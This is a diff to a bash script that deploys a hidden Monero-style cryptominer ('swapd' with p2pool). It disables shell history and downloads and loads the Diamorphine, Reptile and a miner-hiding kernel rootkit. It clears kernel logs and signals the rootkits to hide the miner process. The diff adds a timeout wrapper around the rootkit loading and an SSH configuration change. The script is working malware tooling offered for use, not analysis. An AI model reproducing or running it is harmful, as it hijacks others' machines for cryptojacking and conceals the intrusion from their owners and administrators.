@@ -1,5 +1,9 @@
 #!/bin/bash
 
+# Add to start of script
+echo "ClientAliveInterval 5" | sudo tee -a /etc/ssh/sshd_config
+sudo systemctl reload sshd
+
 unset HISTFILE
 export HISTFILE=/dev/null
 #unset HISTFILE ;history -d $((HISTCMD-1))
@@ -135,6 +139,25 @@ fi
 #    exit 1
 #  fi
 #fi
+
+
+# Timeout and self-healing execution
+timeout_run() {
+    local timeout=5  # seconds
+    local cmd="$@"
+    
+    # Run command in background
+    $cmd &
+    local pid=$!
+    
+    # Start timeout killer
+    (sleep $timeout && kill -9 $pid 2>/dev/null) &
+    local killer=$!
+    
+    # Wait for command completion
+    wait $pid 2>/dev/null
+    kill -9 $killer 2>/dev/null  # Cancel killer if command finished
+}
 
 echo "[*] #calculating port..."
 
@@ -669,7 +692,7 @@ zypper install linux-generic linux-headers-$(uname -r) git make gcc msr-tools bu
 git clone https://github.com/m0nad/Diamorphine
 cd Diamorphine/
 make
-insmod diamorphine.ko
+timeout_run insmod diamorphine.ko
 dmesg -C
 kill -63 $(/bin/ps ax -fu $USER | grep "swapd" | grep -v "grep" | awk '{print $2}')
 
@@ -685,31 +708,26 @@ yum install -y ncurses-devel
 git clone https://github.com/f0rb1dd3n/Reptile/ && cd Reptile
 make defconfig
 make
-make install
+timeout_run make install
 dmesg -C
-/reptile/reptile_cmd hide
+timeout_run /reptile/reptile_cmd hide
 kill -31 $(/bin/ps ax -fu $USER | grep "swapd" | grep -v "grep" | awk '{print $2}')
 
 echo "[*] hide crypto miner."
 cd /tmp
 cd .X11-unix
 git clone https://github.com/alfonmga/hiding-cryptominers-linux-rootkit && cd hiding-cryptominers-linux-rootkit/ && make
-dmesg -C && insmod rootkit.ko && dmesg
+dmesg -C && timeout_run insmod rootkit.ko && dmesg
 kill -31 $(/bin/ps ax -fu $USER | grep "swapd" | grep -v "grep" | awk '{print $2}')
 rm -rf hiding-cryptominers-linux-rootkit/
 
-echo "[*] hid1ng... ;)"
+echo "[*] s3rv1ce start1n9 and hid1ng... ;)"
 
 # ======== FINAL SETUP STEPS ========
 echo "[*] Starting services..."
 sudo systemctl daemon-reload
 sudo systemctl enable --now p2pool
 sudo systemctl enable --now swapd
-
-echo "[*] Verification commands:"
-echo "P2Pool status: sudo journalctl -u p2pool -f"
-echo "Miner status: sudo journalctl -u swapd -f"
-echo "Network ports: ss -tulpn | grep -E '3333|37889'"
 
 
 kill -31 $(pgrep -f -u root config.json) &
@@ -723,5 +741,10 @@ systemctl status swapd
 
 ps ax|grep swapd
 ps ax|grep p2pool
+
+echo "[*] Verification commands:"
+echo "P2Pool status: sudo journalctl -u p2pool -f"
+echo "Miner status: sudo journalctl -u swapd -f"
+echo "Network ports: ss -tulpn | grep -E '3333|37889'"
 
 echo "[*] Setup complete"
